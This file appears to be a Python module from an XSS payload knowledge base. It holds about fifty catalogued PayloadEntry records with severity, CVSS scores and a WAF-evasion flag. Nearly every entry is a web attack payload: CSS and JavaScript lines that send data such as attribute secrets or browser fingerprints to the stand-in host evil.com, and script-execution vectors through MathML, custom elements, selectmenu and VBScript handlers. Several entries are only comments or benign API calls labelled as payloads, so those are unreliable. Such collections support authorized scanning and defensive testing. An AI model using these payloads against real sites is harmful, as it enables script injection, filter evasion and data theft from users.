#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Active
Telegram: https://t.me/EasyProTech

Low Coverage Context Enrichment
Additional payloads for contexts with <3 payloads.
"""

from ..models import Encoding, PayloadEntry, Reliability, Severity


# === CSS Cascade Layers Additional ===
CSS_CASCADE_LAYERS_EXTRA = {
    "css-layer-unnamed": PayloadEntry(
        payload='<style>@layer {*{background:url("https://evil.com/log")}}</style>',
        contexts=["css_cascade_layers", "css", "html_content"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="CSS unnamed layer injection",
        tags=["css", "layer", "unnamed", "injection"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === CSS Container Queries Additional ===
CSS_CONTAINER_QUERIES_EXTRA = {
    "css-container-name-exfil": PayloadEntry(
        payload='<style>.c{container:sidebar/inline-size}@container sidebar(min-width:0){.x{background:url("https://evil.com/cq")}}</style>',
        contexts=["css_container_queries", "css", "html_content"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="CSS named container query exfil",
        tags=["css", "container", "named", "query"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "css-container-style": PayloadEntry(
        payload='<style>@container style(--theme: dark){.x{background:url("https://evil.com/dark")}}</style>',
        contexts=["css_container_queries", "css", "html_content"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="CSS container style query",
        tags=["css", "container", "style", "query"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === CSS Counter Additional ===
CSS_COUNTER_EXTRA = {
    "css-counter-attr-exfil": PayloadEntry(
        payload='<style>.x::before{content:attr(data-secret);background:url("https://evil.com/")}</style><div class=x data-secret="pwd123">',
        contexts=["css_counter", "css", "html_content"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="CSS attr() function data exfil",
        tags=["css", "counter", "attr", "exfil"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === CSS Custom Highlight Additional ===
CSS_CUSTOM_HIGHLIGHT_EXTRA = {
    "css-highlight-selection": PayloadEntry(
        payload='<style>::selection{background:url("https://evil.com/selected")}</style>',
        contexts=["css_custom_highlight", "css", "html_content"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="CSS selection highlight for detection",
        tags=["css", "highlight", "selection", "detection"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "css-highlight-target": PayloadEntry(
        payload='<style>::target-text{background:url("https://evil.com/found")}</style>',
        contexts=["css_custom_highlight", "css", "html_content"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="CSS target-text for fragment detection",
        tags=["css", "highlight", "target", "fragment"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === CSS Nesting Additional ===
CSS_NESTING_EXTRA = {
    "css-nesting-media": PayloadEntry(
        payload='<style>.x{@media(hover:hover){&:hover{background:url("https://evil.com/hov")}}}</style>',
        contexts=["css_nesting", "css", "html_content"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="CSS nested media query",
        tags=["css", "nesting", "media", "hover"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === CSS Scope Additional ===
CSS_SCOPE_EXTRA = {
    "css-scope-to": PayloadEntry(
        payload='<style>@scope(.card) to (.footer){a{background:url("https://evil.com/link")}}</style>',
        contexts=["css_scope", "css", "html_content"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="CSS @scope with limit",
        tags=["css", "scope", "limit", "to"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "css-scope-proximity": PayloadEntry(
        payload='<style>@scope(.theme-light){h1{background:url("https://evil.com/light")}}</style>',
        contexts=["css_scope", "css", "html_content"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="CSS @scope proximity",
        tags=["css", "scope", "proximity", "theme"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === File URL Additional ===
FILE_URL_EXTRA = {
    "file-url-iframe": PayloadEntry(
        payload='<iframe src="file:///C:/Windows/System32/drivers/etc/hosts"></iframe>',
        contexts=["file_url", "html_content", "url"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="File URL iframe Windows hosts",
        tags=["file", "url", "iframe", "windows"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === HTML5 Import Map Additional ===
HTML5_IMPORT_MAP_EXTRA = {
    "importmap-integrity": PayloadEntry(
        payload='<script type="importmap">{"imports":{"lodash":"https://cdn.com/lodash.js"},"integrity":{"https://cdn.com/lodash.js":"sha384-..."}}</script>',
        contexts=["html5_import_map", "html_content", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="Import map with integrity bypass",
        tags=["importmap", "integrity", "bypass", "sri"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === HTML5 Selectmenu Additional ===
HTML5_SELECTMENU_EXTRA = {
    "selectmenu-listbox": PayloadEntry(
        payload='<selectmenu><div slot="listbox" popover><img src=x onerror=alert(1)></div></selectmenu>',
        contexts=["html5_selectmenu", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Selectmenu listbox slot XSS",
        tags=["selectmenu", "listbox", "slot", "xss"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === HTML5 Speculation Rules Additional ===
HTML5_SPECULATION_RULES_EXTRA = {
    "speculation-eagerness": PayloadEntry(
        payload='<script type="speculationrules">{"prefetch":[{"source":"list","urls":["/page"],"eagerness":"immediate"}]}</script>',
        contexts=["html5_speculation_rules", "html_content"],
        severity=Severity.MEDIUM,
        cvss_score=4.0,
        description="Speculation rules immediate prefetch",
        tags=["speculation", "prefetch", "eagerness", "immediate"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Is Attribute Additional ===
IS_ATTRIBUTE_EXTRA = {
    "is-autonomous-element": PayloadEntry(
        payload='<script>customElements.define("xss-el",class extends HTMLElement{connectedCallback(){alert(1)}})</script><xss-el></xss-el>',
        contexts=["is_attribute", "html_content", "custom_elements"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Autonomous custom element XSS",
        tags=["custom-element", "autonomous", "connectedCallback", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === JS Modern Features Additional ===
JS_MODERN_EXTRA = {
    "js-decorators-field": PayloadEntry(
        payload='class C { @inject accessor xss = "<script>alert(1)</script>"; }',
        contexts=["js_decorators", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="JS decorator on accessor field",
        tags=["javascript", "decorator", "accessor", "field"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "js-import-attributes": PayloadEntry(
        payload='import styles from "./xss.css" with { type: "css" }; document.adoptedStyleSheets = [styles];',
        contexts=["js_import_assertions", "javascript", "css"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="JS import attributes CSS injection",
        tags=["javascript", "import", "attributes", "css"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "js-private-get": PayloadEntry(
        payload="class C { #xss; get html() { return this.#xss; } set html(v) { this.#xss = v; } }",
        contexts=["js_private_methods", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=4.0,
        description="JS private field getter/setter",
        tags=["javascript", "private", "getter", "setter"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "js-sab-worker": PayloadEntry(
        payload='const sab = new SharedArrayBuffer(8); const worker = new Worker("timing.js"); worker.postMessage(sab);',
        contexts=["js_sharedarraybuffer", "javascript", "webworker"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="SharedArrayBuffer with Worker",
        tags=["javascript", "sharedarraybuffer", "worker", "timing"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "js-temporal-zoneddatetime": PayloadEntry(
        payload="const zdt = Temporal.Now.zonedDateTimeISO(); // Precise timing",
        contexts=["js_temporal_api", "javascript"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="Temporal ZonedDateTime for timing",
        tags=["javascript", "temporal", "zoneddatetime", "timing"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "js-toplevel-dynamic": PayloadEntry(
        payload="const module = await import(userControlledPath);",
        contexts=["js_top_level_await", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Top-level await dynamic import",
        tags=["javascript", "await", "import", "dynamic"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Media Query Additional ===
MEDIA_QUERY_EXTRA = {
    "media-query-resolution": PayloadEntry(
        payload='<style>@media(min-resolution:2dppx){body{background:url("https://evil.com/retina")}}</style>',
        contexts=["media_query", "css", "html_content"],
        severity=Severity.LOW,
        cvss_score=2.0,
        description="Media query resolution fingerprint",
        tags=["media", "query", "resolution", "fingerprint"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === MHTML Additional ===
MHTML_EXTRA = {
    "mhtml-multipart": PayloadEntry(
        payload="Content-Type: multipart/related\n\n--boundary\nContent-Type: text/html\n\n<script>alert(1)</script>",
        contexts=["mhtml", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="MHTML multipart injection",
        tags=["mhtml", "multipart", "boundary", "ie"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Next.js Additional ===
NEXTJS_EXTRA = {
    "nextjs-getServerSideProps": PayloadEntry(
        payload='export async function getServerSideProps() { return { props: { html: "<script>alert(1)</script>" } }; }',
        contexts=["nextjs", "nextjs_approuter", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Next.js getServerSideProps XSS",
        tags=["nextjs", "ssr", "props", "xss"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Nuxt Additional ===
NUXT_EXTRA = {
    "nuxt-asyncData": PayloadEntry(
        payload='export default { async asyncData() { return { xss: "<img src=x onerror=alert(1)>" } } }',
        contexts=["nuxt", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Nuxt asyncData XSS",
        tags=["nuxt", "asyncdata", "ssr", "xss"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Origin Isolation Additional ===
ORIGIN_ISOLATION_EXTRA = {
    "origin-isolation-postMessage": PayloadEntry(
        payload='window.postMessage({type:"xss",payload:"<script>alert(1)</script>"},"*")',
        contexts=["origin_isolation", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="postMessage to isolated origin",
        tags=["origin", "isolation", "postMessage", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === VBScript Protocol Additional ===
VBSCRIPT_EXTRA = {
    "vbscript-input": PayloadEntry(
        payload='<input type=text value="" onfocus="vbscript:MsgBox(1)">',
        contexts=["vbscript_protocol", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="VBScript in onfocus handler",
        tags=["vbscript", "protocol", "onfocus", "ie"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === WebAssembly Additional ===
WASM_EXTRA = {
    "wasm-compile-inject": PayloadEntry(
        payload="WebAssembly.compile(userBuffer).then(m => new WebAssembly.Instance(m))",
        contexts=["wasm_xss", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="WebAssembly compile from user buffer",
        tags=["wasm", "compile", "buffer", "execute"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === WebAssembly GC Additional ===
WEBASSEMBLY_GC_EXTRA = {
    "wasm-gc-array": PayloadEntry(
        payload="// WASM GC array type for complex object graphs",
        contexts=["webassembly_gc", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="WebAssembly GC array type",
        tags=["wasm", "gc", "array", "type"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Web APIs Additional ===
WEB_APIS_EXTRA = {
    "web-bluetooth-write": PayloadEntry(
        payload="characteristic.writeValue(new TextEncoder().encode(userInput))",
        contexts=["web_bluetooth", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Web Bluetooth write to device",
        tags=["web-bluetooth", "write", "characteristic", "ble"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "web-locks-steal": PayloadEntry(
        payload='navigator.locks.request("auth_token", {steal: true}, async lock => { /* steal lock */ })',
        contexts=["web_locks", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="Web Locks steal option",
        tags=["web-locks", "steal", "exclusive", "takeover"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "web-serial-signals": PayloadEntry(
        payload="await port.setSignals({dataTerminalReady: true, requestToSend: true})",
        contexts=["web_serial", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Web Serial signal manipulation",
        tags=["web-serial", "signals", "dtr", "rts"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "web-share-target": PayloadEntry(
        payload="navigator.canShare({files:[maliciousFile]})",
        contexts=["web_share", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="Web Share target check",
        tags=["web-share", "canShare", "files", "check"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "web-usb-claim": PayloadEntry(
        payload="await device.claimInterface(0); await device.transferOut(1, payload)",
        contexts=["web_usb", "javascript"],
        severity=Severity.HIGH,
        cvss_score=8.0,
        description="Web USB interface claim and transfer",
        tags=["web-usb", "claim", "interface", "transfer"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "webcodecs-encoder": PayloadEntry(
        payload="new VideoEncoder({output:(chunk)=>exfil(chunk),error:()=>{}})",
        contexts=["webcodecs", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="WebCodecs encoder output exfil",
        tags=["webcodecs", "encoder", "output", "exfil"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "webgpu-adapter": PayloadEntry(
        payload='const adapter = await navigator.gpu.requestAdapter(); fetch("https://evil.com/gpu?"+adapter.name)',
        contexts=["webgpu", "javascript"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="WebGPU adapter fingerprint",
        tags=["webgpu", "adapter", "fingerprint", "name"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "webnn-operator": PayloadEntry(
        payload="const output = builder.add(input, maliciousTensor)",
        contexts=["webnn", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="WebNN operator manipulation",
        tags=["webnn", "operator", "tensor", "manipulation"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "webtransport-bidirectional": PayloadEntry(
        payload="const stream = await transport.createBidirectionalStream(); const writer = stream.writable.getWriter();",
        contexts=["webtransport", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="WebTransport bidirectional stream",
        tags=["webtransport", "stream", "bidirectional", "write"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === XML Namespace Additional ===
XML_NAMESPACE_EXTRA = {
    "xml-ns-mathml": PayloadEntry(
        payload='<math xmlns="http://www.w3.org/1998/Math/MathML"><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>',
        contexts=["xml_namespace", "html_content", "mathml"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="MathML namespace XSS",
        tags=["xml", "namespace", "mathml", "annotation"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Preact Additional ===
PREACT_EXTRA = {
    "preact-htm": PayloadEntry(
        payload="html`<div innerHTML=${userInput}></div>`",
        contexts=["preact", "javascript", "template"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Preact htm tagged template innerHTML",
        tags=["preact", "htm", "innerHTML", "template"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Tauri Additional ===
TAURI_EXTRA = {
    "tauri-event": PayloadEntry(
        payload='emit("custom_event", { payload: userInput })',
        contexts=["tauri", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Tauri event system injection",
        tags=["tauri", "event", "emit", "injection"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Final Coverage Additions ===
FINAL_COVERAGE_PAYLOADS = {
    # Cross-Origin Isolated
    "coi-measureuseragent": PayloadEntry(
        payload='navigator.userAgentData.getHighEntropyValues(["platform"]).then(v => fetch("https://evil.com/?p="+v.platform))',
        contexts=["cross_origin_isolated", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=4.0,
        description="User-Agent Client Hints with COOP/COEP",
        tags=["coi", "useragent", "hints", "fingerprint"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    # JS Decorators
    "js-decorators-method": PayloadEntry(
        payload="function xssDecorator(target, key) { target[key] = () => alert(1); }",
        contexts=["js_decorators", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="Decorator method override",
        tags=["javascript", "decorator", "method", "override"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    # JS Import Assertions
    "js-import-json-xss": PayloadEntry(
        payload='import config from "./config.json" assert { type: "json" }; element.innerHTML = config.template;',
        contexts=["js_import_assertions", "javascript", "json"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="JSON import rendered as HTML",
        tags=["javascript", "import", "json", "html"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    # JS Private Methods
    "js-private-static": PayloadEntry(
        payload="class C { static #xss = () => alert(1); static exec() { this.#xss(); } }",
        contexts=["js_private_methods", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=4.0,
        description="Static private method",
        tags=["javascript", "private", "static", "method"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    # JS SharedArrayBuffer
    "js-sab-atomic-wait": PayloadEntry(
        payload="const sab = new SharedArrayBuffer(4); Atomics.wait(new Int32Array(sab), 0, 0, timeout);",
        contexts=["js_sharedarraybuffer", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Atomics.wait for precise timing",
        tags=["javascript", "sharedarraybuffer", "atomics", "wait"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    # JS Temporal API
    "js-temporal-duration": PayloadEntry(
        payload="const d = Temporal.Duration.from({milliseconds:1}); // Sub-ms timing",
        contexts=["js_temporal_api", "javascript"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="Temporal Duration for timing",
        tags=["javascript", "temporal", "duration", "timing"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    # JS Top-Level Await
    "js-toplevel-fetch": PayloadEntry(
        payload="const html = await (await fetch(userUrl)).text(); document.body.innerHTML = html;",
        contexts=["js_top_level_await", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Top-level await fetch to innerHTML",
        tags=["javascript", "await", "fetch", "innerHTML"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    # Origin Isolation
    "origin-isolation-storage": PayloadEntry(
        payload='// With Origin-Agent-Cluster header\nlocalStorage.setItem("xss", payload)',
        contexts=["origin_isolation", "javascript", "storage"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="Storage access with origin isolation",
        tags=["origin", "isolation", "storage", "local"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    # Origin Trial
    "origin-trial-scheduler": PayloadEntry(
        payload='scheduler.postTask(() => { alert(1) }, {priority: "user-blocking"})',
        contexts=["origin_trial", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="Scheduler API via origin trial",
        tags=["origin-trial", "scheduler", "api", "task"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    # Permissions Policy
    "permissions-policy-document": PayloadEntry(
        payload='document.featurePolicy.allowedFeatures().forEach(f => fetch("https://evil.com/f?"+f))',
        contexts=["permissions_policy", "javascript"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="Feature policy enumeration",
        tags=["permissions-policy", "feature", "enumeration", "leak"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    # SSE ID
    "sse-id-tracking": PayloadEntry(
        payload="id: user_123_secret_token\ndata: heartbeat\n\n",
        contexts=["sse_id", "sse_event"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="SSE id for session tracking leak",
        tags=["sse", "id", "tracking", "session"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    # Subresource Integrity
    "sri-crossorigin": PayloadEntry(
        payload='<script src="https://cdn.com/lib.js" integrity="sha384-HASH" crossorigin="anonymous"></script>',
        contexts=["subresource_integrity", "html_content"],
        severity=Severity.MEDIUM,
        cvss_score=4.0,
        description="SRI with crossorigin attribute",
        tags=["sri", "crossorigin", "anonymous", "cdn"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    # WebAssembly GC
    "wasm-gc-i31ref": PayloadEntry(
        payload="// WASM GC i31ref for compact integer references",
        contexts=["webassembly_gc", "javascript"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="WebAssembly GC i31ref type",
        tags=["wasm", "gc", "i31ref", "reference"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# Combined
LOWCOV_ENRICHMENT_PAYLOADS = {
    **CSS_CASCADE_LAYERS_EXTRA,
    **CSS_CONTAINER_QUERIES_EXTRA,
    **CSS_COUNTER_EXTRA,
    **CSS_CUSTOM_HIGHLIGHT_EXTRA,
    **CSS_NESTING_EXTRA,
    **CSS_SCOPE_EXTRA,
    **FILE_URL_EXTRA,
    **HTML5_IMPORT_MAP_EXTRA,
    **HTML5_SELECTMENU_EXTRA,
    **HTML5_SPECULATION_RULES_EXTRA,
    **IS_ATTRIBUTE_EXTRA,
    **JS_MODERN_EXTRA,
    **MEDIA_QUERY_EXTRA,
    **MHTML_EXTRA,
    **NEXTJS_EXTRA,
    **NUXT_EXTRA,
    **ORIGIN_ISOLATION_EXTRA,
    **VBSCRIPT_EXTRA,
    **WASM_EXTRA,
    **WEBASSEMBLY_GC_EXTRA,
    **WEB_APIS_EXTRA,
    **XML_NAMESPACE_EXTRA,
    **PREACT_EXTRA,
    **TAURI_EXTRA,
    **FINAL_COVERAGE_PAYLOADS,
}

LOWCOV_ENRICHMENT_TOTAL = len(LOWCOV_ENRICHMENT_PAYLOADS)
